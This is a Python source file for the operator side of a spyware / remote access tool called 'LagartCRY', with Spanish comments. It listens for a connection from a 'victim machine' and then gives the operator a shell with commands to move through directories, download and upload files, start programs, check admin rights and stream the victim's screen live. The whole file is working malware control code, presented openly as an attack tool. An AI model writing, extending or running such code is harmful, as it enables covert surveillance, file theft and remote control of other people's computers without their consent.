#!/usr/bin/env python
#_*_coding: utf8_*_
import pyfiglet
from colorama import Fore
import socket
import base64
import cv2
import numpy as np
from vidstream import StreamingServer
import threading
#función de incio de spyware
def inicio():
    text=pyfiglet.figlet_format('LagartCRY')
    print(Fore.GREEN+text)
    print('--Comandos de la herramienta--')
    print('*cd--Para moverse de directorios')
    print('*download--Para descargar archivos de la maquina victima')
    print('*upload--Para subir archivos a la maquina victima')
    print('*screenlive--Para transmitir la pantalla en tiempo real de la maquina')
    print('*get--Para descargar páginas de la web(index.html)')
    print('*start--Para iniciar programas en la maquina victima')
    print('*check--Para checar si eres administrador')
#funcion de la shell ---------------------------------------------------------------
def shell():
    current_dir=target.recv(1024)
    count = 0
    while True:
        comando= input("{}$-DrConnors26:".format(current_dir.decode()))
#Empieza la configuracion de los comandos ------------------------------------------
        if comando== 'exit':
            target.send(comando.encode())
            break
        elif comando[:2]=='cd':
            target.send(comando.encode())
            res=target.recv(1024)
            current_dir=res
            print(res.decode('latin1'))
        elif comando=='':
            pass
        elif comando[:8]=='download':
            target.send(comando.encode())
            with open(comando[9:],'wb') as file_download:
                datos=target.recv(30000)
                file_download.write(base64.b64decode(datos))
        elif comando[:6]=='upload':
            try:
                target.send(comando.encode())
                with open(comando[7:],'rb')as file_upload:
                    target.send(base64.b64encode(file_upload.read()))
            except:
                print('ocurrio un error en la subida de datos')
        elif comando=='screenlive':
            target.send(comando.encode())
            print('Iniciando Live')
            receiver=StreamingServer('192.168.0.10',3333)
            t= threading.Thread(target=receiver.start_server)
            t.start()
        elif comando=='stopscreenlive':
            target.send(comando.encode())
            receiver.stop_server()
            #while True:
                #target.send(comando.encode())
                #frame_length = int.from_bytes(target.recv(4), byteorder='big')
                # Recibir el frame codificado
                #encoded_frame = bytearray()
                #while len(encoded_frame) < frame_length:
                #    encoded_frame += target.recv(frame_length - len(encoded_frame))
                # Decodificar el frame y mostrarlo
                #frame = cv2.imdecode(np.frombuffer(encoded_frame, np.uint8), 1)
                #cv2.imshow('Pantalla en tiempo real', frame)
                # Romper el loop si se presiona la tecla 'q'
                #if cv2.waitKey(1) & 0xFF == ord('q'):
                #    cv2.destroyAllWindows()
                #    comando=''
                #    target.send(comando.encode())
                #    break
        else:
            target.send(comando.encode())
            res=target.recv(30000)
            if res=='1':
                continue
            else:
                print(res.decode('latin1'))







#Lenvantar servidor------------------------------------------------------------------
def upserver():
    global server
    global target
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('192.168.0.10', 9999))
    server.listen(1)
    print('Corriendo el servidor, esperando conexiones.....')
    target, ip = server.accept()
    print('Conexión recibida de: ' + ip[0])
#llamar las funciones ---------------------------------------------------------------
upserver()
inicio()
shell()
target.close()
server.close()